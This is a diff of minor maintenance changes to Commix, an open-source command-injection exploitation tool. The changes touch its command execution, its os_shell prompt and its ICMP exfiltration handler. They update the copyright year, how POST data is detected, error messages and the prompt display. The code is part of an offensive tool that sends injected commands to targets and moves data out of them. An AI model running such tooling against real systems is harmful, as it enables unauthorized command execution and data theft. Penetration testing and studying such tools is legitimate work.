@@ -3,7 +3,7 @@
 
 """
 This file is part of Commix Project (https://commixproject.com).
-Copyright (c) 2014-2021 Anastasios Stasinopoulos (@ancst).
+Copyright (c) 2014-2022 Anastasios Stasinopoulos (@ancst).
 
 This program is free software: you can redistribute it and/or modify
 it under the terms of the GNU General Public License as published by
@@ -84,7 +84,9 @@ def cmd_exec(http_request_method, cmd, url, vuln_parameter, ip_src):
     sys.stdout.write(settings.print_debug_msg(debug_msg))
     sys.stdout.flush()
     sys.stdout.write("\n" + settings.print_payload(payload) + "\n")
-  if not menu.options.data:
+  
+  # Check if defined POST data
+  if not settings.USER_DEFINED_POST_DATA:
     url = url.replace(settings.INJECT_TAG, "")
     data = payload.replace(" ", "%20")
     req = url + data
@@ -109,7 +111,7 @@ def cmd_exec(http_request_method, cmd, url, vuln_parameter, ip_src):
     raise SystemExit()
 
   except _urllib.error.URLError as err_msg:
-    print(settings.print_critical_msg(str(err_msg.args[0]).split("] ")[1] + "."))
+    print(settings.print_critical_msg(str(err_msg.reason) + "."))
     raise SystemExit()
 
   except _http_client.InvalidURL as err:
@@ -153,7 +155,8 @@ def input_cmd(http_request_method, url, vuln_parameter, ip_src, technique):
         try:
           if not settings.READLINE_ERROR:
             checks.tab_autocompleter()
-          cmd = _input("""commix(""" + Style.BRIGHT + Fore.RED + """os_shell""" + Style.RESET_ALL + """) > """)
+          sys.stdout.write(settings.OS_SHELL)
+          cmd = _input()
           cmd = checks.escaped_cmd(cmd)
           if cmd.lower() in settings.SHELL_OPTIONS:
             if cmd.lower() == "quit" or cmd.lower() == "back":       
@@ -212,7 +215,8 @@ def icmp_exfiltration_handler(url, http_request_method):
     print(settings.print_critical_msg(err_msg) + "\n")
     os._exit(0)
 
-  if not menu.options.data:
+  # Check if defined POST data
+  if not settings.USER_DEFINED_POST_DATA:
     #url = parameters.do_GET_check(url, http_request_method)
     request = _urllib.request.Request(url)
     headers.do_check(request)
@@ -220,7 +224,7 @@ def icmp_exfiltration_handler(url, http_request_method):
     
   else:
     parameter = menu.options.data
-    parameter = _urllib.parse.unquote(parameter)
+    #parameter = _urllib.parse.unquote(parameter)
     parameter = parameters.do_POST_check(parameter, http_request_method)
     request = _urllib.request.Request(url, parameter)
     headers.do_check(request)
